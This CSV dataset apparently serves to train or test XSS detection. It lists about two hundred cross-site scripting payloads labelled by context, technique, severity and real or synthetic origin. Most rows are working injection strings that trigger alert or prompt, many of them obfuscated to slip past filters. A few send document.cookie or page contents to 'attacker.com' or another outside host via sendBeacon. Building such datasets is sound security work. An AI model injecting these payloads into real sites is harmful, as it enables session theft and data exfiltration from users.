payload,context,technique,severity,length,source
<multicol contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,62,real
<body onscroll=javascript:alert(8034)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,js_uri,none,medium,215,real
"__pRotO__[""oNplAyiNg""]=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))",dom_sink,synthetic,high,61,synthetic
"<style>:target {color:red;}</style><marquee id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></marquee>",tag_injection,none,medium,118,real
%3C!--%3E%3Ctd onkeyup=confirm(document.domain)%3E,tag_injection,synthetic,medium,50,synthetic
' %3E%3Csvg onmousewheel=alert(document.domain)%3E,attribute_escape,synthetic,medium,50,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onr&#101;p&#101;&#97;t"":consol&#101;.log})",dom_sink,synthetic,low,74,synthetic
`><Img srC=x onFulLscReeNchAngE=aLerT(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,53,synthetic
"""'><img src=xxx:x \x0Donerror=javascript:alert(3902)>",js_uri,none,medium,53,real
%3C!--%3E%3Cobject onwebkitanimationend=alert(location.hash)%3E,tag_injection,synthetic,medium,63,synthetic
<auDio onPopStaTe=ConFirM(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
"<ul ondblclick=""alert(1)"">AnonKryptiQuz</ul>",tag_injection,none,medium,44,real
"<div draggable=""true"" contenteditable>drag me</div><em ondragover=alert(1) contenteditable style=display:block>drop here</em>",tag_injection,none,medium,125,real
"<button onmouseup=""alert(1)"">AnonKryptiQuz</button>",tag_injection,none,medium,51,real
<script x>alert('XSS')<script y>,script_injection,none,medium,32,real
<svg onpromptdismiss=alert(location.hash) onpromptdismiss=alert(location.hash)>,tag_injection,synthetic,medium,79,synthetic
"document.body.innerHTML=""<img src=x onerror=alert(document.cookie+'&loc='+location.href)>""",dom_sink,synthetic,high,90,synthetic
"<rtc onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</rtc>",tag_injection,none,medium,62,real
"\%22 onselect=prompt(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,53,synthetic
<marquee/onauxclick=prompt(location.hash)>,tag_injection,synthetic,medium,42,synthetic
%3Csource x=y oninput=alert(location.hash)%3E,tag_injection,synthetic,medium,45,synthetic
"' ><svg onerror=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
<script>/x/&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</script>,script_injection,synthetic,low,60,synthetic
""" oninput=&#97;l&#101;rt(1) """,attribute_escape,synthetic,low,29,synthetic
onh&#97;shch&#97;ng&#101;=confirm('XSS'),event_handler,synthetic,medium,40,synthetic
"<xmp onmouseup=""alert(1)"">AnonKryptiQuz</xmp>",tag_injection,none,medium,45,real
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=&#101;v&#97;l('XSS')>"")",dom_sink,synthetic,low,131,synthetic
"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" ontransitionend=alert(1)></code>",tag_injection,none,medium,106,real
<ul onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</ul><input value=clickme>,tag_injection,none,medium,95,real
\' OnbEfoRetOggLe=ConFirM(lOcaTioN.hAsh)//,attribute_escape,synthetic,medium,42,synthetic
javascript:confirm/***/(document.domain),js_uri,synthetic,low,40,synthetic
"Obj&#101;ct.&#97;ssign(window,{""ontouchst&#97;rt"":f&#101;tch})",dom_sink,synthetic,low,62,synthetic
' oNtoUchEnd=coNsoLe.Log('XSS') ',attribute_escape,synthetic,medium,33,synthetic
<&#97; ons&#101;&#97;rch=&#97;l&#101;rt(1) ons&#101;&#97;rch=&#97;l&#101;rt(1)>,tag_injection,synthetic,low,79,synthetic
<teMplAte x=Y oNcoNteXtmEnu=coNsoLe.Log(1)>,tag_injection,synthetic,medium,43,synthetic
"%27 onreset=alert(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,high,52,synthetic
"""><audio oninput=prompt(location.hash)>",tag_injection,synthetic,medium,39,synthetic
"OnsEleCt=ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,46,synthetic
"<noembed onmouseenter=""alert(1)"">AnonKryptiQuz</noembed>",tag_injection,none,medium,56,real
"__proto__[""onbegin""]=eval(document.domain)",dom_sink,synthetic,low,42,synthetic
'><img src=x ondragstart=confirm(1)>,attribute_escape,synthetic,medium,36,synthetic
"<tbody onmouseenter=""alert(1)"">AnonKryptiQuz</tbody>",tag_injection,none,medium,52,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><u id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></u>",tag_injection,none,medium,172,real
OnpOinTerMovE=cOnsOle.loG(1),event_handler,synthetic,medium,28,synthetic
""" ><svG oNprOmpTacTioN=pRomPt(1)>",attribute_escape,synthetic,medium,33,synthetic
<noscript ongesturestart=alert('XSS')>,tag_injection,synthetic,medium,38,synthetic
"setTimeout(""alert(1)"",0)",dom_sink,synthetic,medium,24,synthetic
"OnpRomPtaCtiOn=ConFirM/**/(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,57,synthetic
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=pRomPt(DocUmeNt.DomAin)>"")",dom_sink,synthetic,medium,85,synthetic
"<scRipT
>ConSolE.lOg('XSS')</sCriPt>",script_injection,synthetic,medium,36,synthetic
' ><svg onscrollsnapchange=console.log(1)>,attribute_escape,synthetic,medium,42,synthetic
<!--><title onstalled=alert('XSS')>,tag_injection,synthetic,medium,35,synthetic
onbeforepaste=console.log&#40;document.domain&#41;,event_handler,synthetic,low,50,synthetic
location.href=%22javascript:console.log(location.hash)%22,dom_sink,synthetic,high,57,synthetic
"<time onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</time>",tag_injection,none,medium,69,real
"' oNanImaTioNcaNceL=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,high,64,synthetic
%27><img src=x onmousewheel=console.log(1)>,attribute_escape,synthetic,medium,43,synthetic
\' OnpAgeHidE=aLerT(dOcuMenT.dOmaIn)//,attribute_escape,synthetic,medium,38,synthetic
`><img src=x onw&#97;iting=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,61,synthetic
<script>/x/console.log(1)</script>,script_injection,synthetic,medium,34,synthetic
<baSe OnpAgeSwaP=aLerT('XSS')>,tag_injection,synthetic,medium,30,synthetic
"<style>:target {transform: rotate(180deg);}</style><tfoot id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tfoot>",tag_injection,none,medium,128,real
%3C!--%3E%3Cset onfocus=prompt(document.domain)%3E,tag_injection,synthetic,medium,50,synthetic
<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click,tag_injection,none,low,56,real
"""><Img srC=x onTraNsiTioNenD=cOnfIrm('XSS')>",attribute_escape,synthetic,medium,44,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><slot id=x style=""position:absolute;"" onanimationcancel=""print()""></slot>",tag_injection,none,low,177,real
<main onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"""%3E%3Cimg src=x onpromptdismiss=alert('XSS')%3E",attribute_escape,synthetic,medium,48,synthetic
"<dt onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</dt>",tag_injection,none,medium,60,real
"\"" onpagereveal=alert(location.hash)//",attribute_escape,synthetic,medium,38,synthetic
"<div draggable=""true"" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable>drop here</ul>",tag_injection,none,medium,105,real
<listing x=y onpointerrawupdate=\u0061lert('XSS')>,tag_injection,synthetic,low,50,synthetic
"<nav onmousemove=""alert(1)"">AnonKryptiQuz</nav>",tag_injection,none,medium,47,real
%27 onstalled=prompt(1) %27,attribute_escape,synthetic,medium,27,synthetic
"%22 onpromptdismiss=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,61,synthetic
j&#97;v&#97;	script:consol&#101;.log('XSS'),js_uri,synthetic,low,43,synthetic
ontr&#97;nsitionrun=&#97;l&#101;rt/**/(1),event_handler,synthetic,low,41,synthetic
[#prompt document.domain /],template_injection,synthetic,low,27,synthetic
<animatemotion onwaiting=alert(location.hash)>,tag_injection,synthetic,medium,46,synthetic
"\"" OnwAitIng=prOmpT(dOcuMenT.dOmaIn)//",attribute_escape,synthetic,medium,38,synthetic
onstalled=confirm/*x*/(location.hash),event_handler,synthetic,low,37,synthetic
"""><img src=x onp&#97;g&#101;hid&#101;=confirm(1)>",attribute_escape,synthetic,medium,49,synthetic
"""%3E%3Cimg src=x ongestureend=prompt('XSS')%3E",attribute_escape,synthetic,medium,46,synthetic
\' ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log('XSS')//,attribute_escape,synthetic,low,62,synthetic
%27 ><svg onscrollsnapchange=console.log(location.hash)>,attribute_escape,synthetic,medium,56,synthetic
`%3E%3Cimg src=x oncopy=console.log(location.hash)%3E,attribute_escape,synthetic,medium,53,synthetic
 onlo&#97;d=prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,44,synthetic
" onload=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,45,synthetic
 onmousedown=alert(1),event_handler,synthetic,medium,21,synthetic
"""%3E%3Cimg src=x ontransitionstart=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,76,synthetic
""" %3E%3Csvg onpointerup=prompt(location.hash)%3E",attribute_escape,synthetic,medium,48,synthetic
<dd onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</dd>,tag_injection,none,medium,70,real
"<keygen oncut=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",tag_injection,none,medium,63,real
"<animatemotion draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",tag_injection,none,medium,103,real
"onfullscreenchange=javascr	ipt:alert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,67,synthetic
'><Img srC=x onTraNsiTioNenD=aLerT(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,52,synthetic
%3Cscript%3Ealert%28%22AnonKryptiQuz%22%29%3B%3C%2fscript%3E,generic,url_encoding,low,60,real
'><img src=x onp&#97;us&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,73,synthetic
""" ><svG oNweBkiTanImaTioNenD=cOnfIrm('XSS')>",attribute_escape,synthetic,medium,44,synthetic
"document.write(""%3Cimg src=x onerror=fetch(String.fromCharCode(88,83,83))%3E"")",dom_sink,synthetic,high,78,synthetic
<caption onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</caption><input value=clickme>,tag_injection,none,medium,105,real
"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",js_uri,none,medium,60,real
onscrollend=console.log(location.hash),event_handler,synthetic,medium,38,synthetic
%3C!--%3E%3Ctemplate onclose=console.log(1)%3E,tag_injection,synthetic,medium,46,synthetic
"\"" oncanplay=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,53,synthetic
"""%3E%3Cimg src=x onpointerrawupdate=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,77,synthetic
<select src=x onpointermove=prompt('XSS')>,tag_injection,synthetic,medium,42,synthetic
"'><Img srC=x onHasHchAngE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
<param onpointerout=alert(1) style=display:block>AnonKryptiQuz</param>,tag_injection,none,medium,70,real
ontransitionrun=\u0061lert&#40;document.domain&#41;,event_handler,synthetic,low,51,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></menuitem>",tag_injection,none,medium,186,real
onp&#97;g&#101;show=j&#97;v&#97;script:confirm(1),event_handler,synthetic,medium,49,synthetic
"<frame onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</frame>",tag_injection,none,medium,67,real
onbeforeinput=console.log&#40;document.domain&#41;,event_handler,synthetic,low,50,synthetic
"<acronym onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</acronym>",tag_injection,none,medium,75,real
<imG oNkeYprEss=coNsoLe.Log(1)>,tag_injection,synthetic,medium,31,synthetic
"\"" OnpAgeHidE=cOnfIrm(1)//",attribute_escape,synthetic,medium,26,synthetic
"<figcaption onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</figcaption>",tag_injection,none,medium,95,real
"<video onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</video>",tag_injection,none,medium,65,real
' ><svg onpromptdismiss=console.log('XSS')>,attribute_escape,synthetic,medium,43,synthetic
<titl&#101;	onst&#97;ll&#101;d=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,low,53,synthetic
"<figure oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</figure>",tag_injection,none,medium,64,real
{{{&#97;l&#101;rt(1)}}},template_injection,synthetic,low,23,synthetic
"window[""XMLHttpRequest""](document.cookie)",dom_sink,synthetic,high,41,synthetic
OnmOusEdoWn=JavAscRipT:cOnfIrm(1),event_handler,synthetic,medium,33,synthetic
"%22 ><svg onscrollsnapchange=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
\' onend=console.log('XSS')//,attribute_escape,synthetic,medium,29,synthetic
OnwEbkIttRanSitIonEnd=jaVasCriPt:AleRt(LocAtiOn.HasH),event_handler,synthetic,medium,53,synthetic
<img onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,low,76,synthetic
<multicol onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,70,real
" onStaLleD=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,53,synthetic
<img src=x onp&#97;g&#101;sw&#97;p=consol&#101;.log(1)>,tag_injection,synthetic,low,55,synthetic
<listing/ontransitionstart=confirm(document.domain)>,tag_injection,synthetic,medium,52,synthetic
<auDio	onScrOllEnd=prOmpT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
""" onclose=prompt(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,49,synthetic
"(neW FUncTioN(""AleRt(BtoA(dOcuMenT.cOokIe))""))();",dom_sink,synthetic,high,49,synthetic
	onbeforecopy=alert(document.domain),event_handler,synthetic,medium,36,synthetic
<aside onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</aside>,tag_injection,none,medium,76,real
<optgroup onpointerout=alert(1) style=display:block>AnonKryptiQuz</optgroup>,tag_injection,none,medium,76,real
<html ontouchmove=alert(1)>,tag_injection,none,medium,27,real
<mtext onmousedown=console.log(1) onmousedown=console.log(1)>,tag_injection,synthetic,medium,61,synthetic
"__proto__[""onplay""]=console.log(document.domain)",dom_sink,synthetic,medium,48,synthetic
" onlo&#97;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,58,synthetic
"<u draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</u>",tag_injection,none,medium,80,real
<meTa OndRop=alErt(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,36,synthetic
"<![><img src=""]><img src=x onerror=alert(XSS)//"">",tag_injection,none,medium,49,real
"<tr srC=x onTraNsiTioNenD=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,64,synthetic
<a autofocus onfocus=alert(1) href></a>,tag_injection,none,medium,39,real
"element.setAttribute(""onclick"",""prompt(navigator.sendBeacon('//attacker.com',document.cookie))"")",dom_sink,synthetic,high,96,synthetic
`><Img srC=x onStaLleD=pRomPt(1)>,attribute_escape,synthetic,medium,33,synthetic
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></applet>",tag_injection,none,medium,105,real
%27 onbeforematch=confirm(location.hash) %27,attribute_escape,synthetic,medium,44,synthetic
"<mark onmouseover=""alert(1)"">AnonKryptiQuz</mark>",tag_injection,none,medium,49,real
<!--><scr	ipt ondblclick=prompt(1)>,tag_injection,synthetic,medium,35,synthetic
\' onmousedown=confirm(1)//,attribute_escape,synthetic,medium,27,synthetic
"' onpaste=confirm(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,50,synthetic
<fieldset id=x tabindex=1 onbeforedeactivate=alert(1)></fieldset><input autofocus>,tag_injection,none,medium,82,real
' ><svG oNscRolLsnApcHanGe=AleRt(1)>,attribute_escape,synthetic,medium,36,synthetic
"\"" OnpAgeRevEal=coNsoLe.Log(doCumEnt.doMaiN)//",attribute_escape,synthetic,medium,46,synthetic
"<font onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</font>",tag_injection,none,medium,70,real
<button popovertarget=x>Click me</button><rtc ontoggle=alert(1) popover id=x>AnonKryptiQuz</rtc>,tag_injection,none,medium,96,real
document.body.innerHTML=%22<img src=x onerror=confirm(btoa(document.cookie))>%22,dom_sink,synthetic,high,80,synthetic
"SetIntErvAl(""prOmpT(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))"",100)",dom_sink,synthetic,high,81,synthetic
"<noembed onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",tag_injection,none,medium,76,real
\' ontoggle=prompt(1)//,attribute_escape,synthetic,medium,23,synthetic
"`%3E%3Cimg src=x onbeforetoggle=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,71,synthetic
"location.href=""javascr	ipt:eval(location.hash)""",dom_sink,synthetic,high,47,synthetic
"<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,none,high,105,real
'><img src=x onp&#97;g&#101;show=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,67,synthetic
"%27 ><svg onmouseenter=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
""" ><svg onbegin=confirm(location.hash)>",attribute_escape,synthetic,medium,39,synthetic
<title x=y onblur=console.log(location.hash)>,tag_injection,synthetic,medium,45,synthetic
"<b oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,94,real
"location.href=""javascr	ipt:confirm(location.hash)""",dom_sink,synthetic,high,50,synthetic
""" oNdrAgeNteR=cOnsOle.loG(1) """,attribute_escape,synthetic,medium,30,synthetic
<iframe onpointerup=alert(1) style=display:block>AnonKryptiQuz</iframe>,tag_injection,none,medium,71,real
&quOt; onEndEd=AleRt(1) X=&QuoT;,attribute_escape,synthetic,medium,32,synthetic
"<div draggable=""true"" contenteditable>drag me</div><isindex ondrop=alert(1) contenteditable>drop here</isindex>",tag_injection,none,medium,111,real
""" ><svG oNinPut=alErt(1)>",attribute_escape,synthetic,medium,25,synthetic
<section id=x tabindex=1 onfocus=alert(1)></section>,tag_injection,none,medium,52,real
 onerror=console.log('XSS'),event_handler,synthetic,medium,27,synthetic
%22 ondrop=prompt(%27XSS%27) %22,attribute_escape,synthetic,medium,32,synthetic
`><img src=x ontouchend=\u0061lert('XSS')>,attribute_escape,synthetic,low,42,synthetic
"""><img src=x onbegin=confirm(1)>",attribute_escape,synthetic,medium,32,synthetic
"<style>@keyframes slidein {}</style><s style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></s>",tag_injection,none,medium,162,real
